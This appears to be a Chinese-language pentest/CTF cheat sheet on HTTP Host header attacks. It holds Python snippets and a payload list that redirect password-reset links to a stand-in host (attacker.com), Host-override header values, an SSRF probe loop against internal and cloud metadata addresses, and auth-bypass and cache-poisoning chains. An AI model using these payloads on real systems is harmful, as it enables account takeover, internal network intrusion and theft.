# Host Header 攻击

## 攻击面

```
Host 头被后端用于:
├── URL 生成 (密码重置链接、回调 URL)
├── 虚拟主机路由 (vhost)
├── 缓存 key 生成
├── SSO/IdP 回调验证
└── 密码重置 token 邮箱链接
```

## 1. 密码重置劫持

```python
# 场景: POST /forgot {email: victim@x.com}
# 后端生成重置链接: https://{Host}/reset?token=xxx

# 攻击: 修改 Host 头
# Host: attacker.com
# → 受害者收到的邮件链接: https://attacker.com/reset?token=xxx
# → 攻击者拿到 token

import requests

def hijack_password_reset(target: str):
    """修改 Host 头劫持重置 token"""
    r = requests.post(f"{target}/forgot", data={
        "email": "victim@victim.com"
    }, headers={
        "Host": "attacker.com",
        "X-Forwarded-Host": "attacker.com",  # 如果后端用这个
    })
    return r.status_code
```

## 2. Host 头注入变体

```python
HOST_PAYLOADS = [
    # 基础
    "attacker.com",
    # 端口欺骗
    "target.com:1337",
    # 带凭证
    "target.com@attacker.com",
    # 子域名欺骗
    "attacker.com#target.com",
    "attacker.com%23target.com",
    # X-Forwarded-Host (如果后端取这个优先)
    "attacker.com",
    # Host override headers
    "X-Forwarded-Host": "attacker.com",
    "X-Host": "attacker.com",
    "X-Forwarded-Server": "attacker.com",
    "X-HTTP-Host-Override": "attacker.com",
    "Forwarded": "host=attacker.com",
]
```

## 3. Host → SSRF 链

```python
# 如果后端用 Host 头拼接 URL 做服务间调用:
# GET /api/status → 后端请求 http://{Host}/internal/health
# Host: 127.0.0.1 → 后端请求 http://127.0.0.1/internal/health
# → SSRF 打内网服务

# 探测: 修改 Host 为内网地址
for internal in ["127.0.0.1", "localhost", "0.0.0.0", "[::1]", "169.254.169.254"]:
    r = requests.get(target, headers={"Host": internal})
    if r.status_code != baseline:
        print(f"[!] {internal} → {r.status_code}")
```

## 4. Host 头鉴权绕过

```python
# 如果鉴权逻辑基于 Host:
# if Host == "admin.internal" → 跳过认证
# 攻击: Host: admin.internal → 直接进后台

# 或者: Host: localhost → 触发 debug 模式 → 报错泄露源码
```

## 5. Host → Cache Poisoning 链

```python
# Host 头如果不在 Cache Key 中:
# 首次请求 Host: evil.com → CDN 缓存响应
# 后续所有用户看到此缓存 → XSS/Phish
# 详见 08-infra/race-cache-smuggling.md
```

## 6. 攻击链

```
Host 注入 → 密码重置 token 泄露 → Account Takeover
Host 注入 → 后端 URL 拼接 → SSRF → 内网 RCE
Host: localhost → Debug 模式 → 源码泄露 → 硬编码密钥
Host override → Vhost 路由绕过 → 管理后台 → RCE
```

## 工具引用

```bash
# 项目内 HTTP 探测框架
python scripts/ctf-website/http_probe.py

# 安装第三方工具
powershell scripts/ctf-website/install_missing_tools.ps1
```
